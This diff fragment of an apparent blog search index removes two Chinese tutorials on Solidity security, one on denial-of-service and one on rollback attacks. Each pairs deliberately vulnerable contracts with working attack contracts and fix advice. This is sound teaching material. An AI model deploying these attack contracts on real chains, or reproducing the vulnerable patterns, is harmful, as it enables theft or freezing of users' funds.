+<li>设置合适的舍入规则，对于向上&#x2F;向下取整的情况，应考虑多种复杂的场景；</li>
+<li>使用安全有效的高精度计算库；</li>
 </ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>拒绝服务攻击</title>
-    <url>/2023/09/09/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>拒绝服务（DOS）攻击是一种常见的网络攻击手段，其目的是通过向目标服务器发送大量请求或占用其资源，使其无法正常处理合法用户的请求。在智能合约中，攻击者可以通过发送恶意交易或利用智能合约中的漏洞使得智能合约系统无法正常运行，从而导致服务拒绝或系统瘫痪，因此智能合约的设计和实现应该考虑到DOS攻击的威胁并采取相应的安全措施来保障系统的稳定性和可靠性。</p>
-<p>拒绝服务主要包含以下四大类：</p>
-<p><strong>非预期的外部调用</strong></p>
-<p>当合约对外部调用处理不当时可能导致拒绝服务。例如合约中存在基于外部函数执行的结果来改变合约状态且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，合约则会一直重复这笔失败的交易从而造成合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可用。</p>
-<p><strong>Gas达到区块上限</strong></p>
-<p>当交易的gas开销达到区块上限时交易会失败，导致拒绝服务。例如合约中的映射或数组长度没有限制，导致循环遍历时消耗大量的 gas ，当 gas limit 高于可用的 max limit时，导致交易失败。</p>
-<p><strong>逻辑设计缺陷</strong></p>
-<p>当合约自身的逻辑实现存在缺陷时，攻击者可利用该缺陷导致合约不可用。例如当合约的某个功能没有考虑全面，而实际使用存在多种极端情况，合约中某个功能无法正常处理特殊的交易或陷入瘫痪，最后导致拒绝服务。</p>
-<p><strong>运营管理不当</strong></p>
-<p>当合约后期运营管理不当可能导致拒绝服务。例如 Owner 或 管理员权限过大，敏感操作失误或私钥丢失等可能会导致拒绝服务攻击，如 selfdestruct 函数被非预期执行。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>下面代码中是个DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用 deposit 退钱。<br>由于在调用 refund 取款的时候由于 Attack 合约中有 fallback、receive 中执行了 revert 回退，导致 DosGame.refund 的 call 检查转账结果返回 false 而导致合约无法正常提款。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract DosGame &#123;</span><br><span class="line">    bool public refundFinished;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    address[] public players;</span><br><span class="line"></span><br><span class="line">    // 所有玩家存ETH到合约里</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);</span><br><span class="line">        // 记录存款</span><br><span class="line">        balanceOf[msg.sender] = msg.value;</span><br><span class="line">        // 记录玩家地址</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 游戏结束，退款开始，所有玩家将依次收到退款</span><br><span class="line">    function refund() external &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        uint256 pLength = players.length;</span><br><span class="line">        // 通过循环给所有玩家退款</span><br><span class="line">        for(uint256 i; i &lt; pLength; i++)&#123;</span><br><span class="line">            address player = players[i];</span><br><span class="line">            uint256 refundETH = balanceOf[player];</span><br><span class="line">            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);</span><br><span class="line">            require(success, &quot;Refund Fail!&quot;);</span><br><span class="line">            balanceOf[player] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        refundFinished = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    // 退款时进行DoS攻击</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 参与DoS游戏并存款</span><br><span class="line">    function attack(address gameAddr) external payable &#123;</span><br><span class="line">        DosGame dos = DosGame(gameAddr);</span><br><span class="line">        dos.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>在进行外部调用时返回结果是否符合预期，不应完全依赖外部调用结果；</li>
-<li>在使用循环或外部调用或复杂操作时，应考虑 Gas 消耗；</li>
-<li>合约逻辑设计应充分考虑所有可能的情况，并进行适当的处理；</li>
-<li>避免对单个角色过度授权，处理合约权限是应做到合理的权限划分，对拥有权限的角色使用多签钱包管理，防止由于私钥泄露导致权限丢失。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>回退攻击</title>
-    <url>/2023/09/30/%E5%9B%9E%E9%80%80%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>回退攻击是根据执行结果来决定的，如果操作结果没有达到攻击者预期的效果，攻击者会让交易回退。使用 require(), revert() 和 assert() 可以使不满足条件的调用失败，从而回退交易。</p>
-<p><strong>require(), revert() 和 assert()</strong><br>是Solidity 0.4.10及之后的版本中错误处理机制，下面3个语句等价：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition) &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">assert(condition);</span><br><span class="line"></span><br><span class="line">require(condition);</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>1. require</strong></p>
-<ul>
-<li>通常用于执行前输入验证和状态检查，一般用于函数的开头处；</li>
-<li>退还剩余的 Gas；</li>
-</ul>
-<p><strong>2. revert</strong></p>
-<ul>
-<li>通常用于直接触发回退，可自定义异常处理，适用于更复杂逻辑的处理场景；</li>
-<li>退还剩余的 Gas；</li>
-</ul>
-<p><strong>3. aasert</strong></p>
-<ul>
-<li>通常用于预防不应该发生的情况，失败的断言可能意味着代码层存在错误；</li>
-<li>消耗所有剩余的 Gas，并回退所有的操作；</li>
-</ul>
-<p><strong>利用条件</strong></p>
-<ul>
-<li>随机性。合约中的执行结果具有随机性，想要达到预期的执行结果需要进行多次尝试，如果每次执行结果是一样的就没有必要进行回退。</li>
-<li>允许合约调用。攻击者可以在合约中定义攻击逻辑，如果执行结果非期望的结果则进行回退，直到得到期望的结果。如果是 EOA 账户，在交易执行中无法对结果进行判断，只能在交易完成后才能访问结果，此时交易已经完成，区块链状态已经更新则不能进行回退。</li>
-<li>有利可图。合约运行结果中，存在某个结果是有利可图的。</li>
-</ul>
-<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是一个猜数字游戏，猜中数字即可获取 1 个ETH，猜错需要付出 0.1 个ETH，利用回退攻击，只要猜错就执行回退，因此可以通过消耗 gas 费来赢得奖励。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract GuessNum &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() internal view returns(uint256 random) &#123;</span><br><span class="line">        // 此处方便漏洞案例演示，采用伪随机数,请忽略随机数漏洞</span><br><span class="line">        random = uint256(keccak256(abi.encodePacked(block.coinbase, block.difficulty, block.timestamp))) % 10;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 num) public  payable  &#123;</span><br><span class="line">        uint256 rand = _getRandom();</span><br><span class="line">        if ( rand == num) &#123;</span><br><span class="line">            payable(msg.sender).transfer(1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function rollBack(address gameAddr, uint256 num) external payable &#123;</span><br><span class="line">        uint256 beforeBalance = address(this).balance;</span><br><span class="line">        (bool success, ) = address(gameAddr).call&#123;value: 0.1 ether&#125;(abi.encodeWithSignature(&quot;guess(uint256)&quot;, num));</span><br><span class="line">        require(success, &quot;Failed to call.&quot;);</span><br><span class="line">        uint256 afterBalance = address(this).balance;</span><br><span class="line">        if (afterBalance &lt; beforeBalance) &#123;  // 通过余额来判断是否猜对，来决定是否进行回退。</span><br><span class="line">            revert(&quot;Failed to guessNum.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>只允许 EOA 账户进行调用 或 限制特定合约地址调用。</p>
 ]]></content>
       <tags>
         <tag>Solidity</tag>
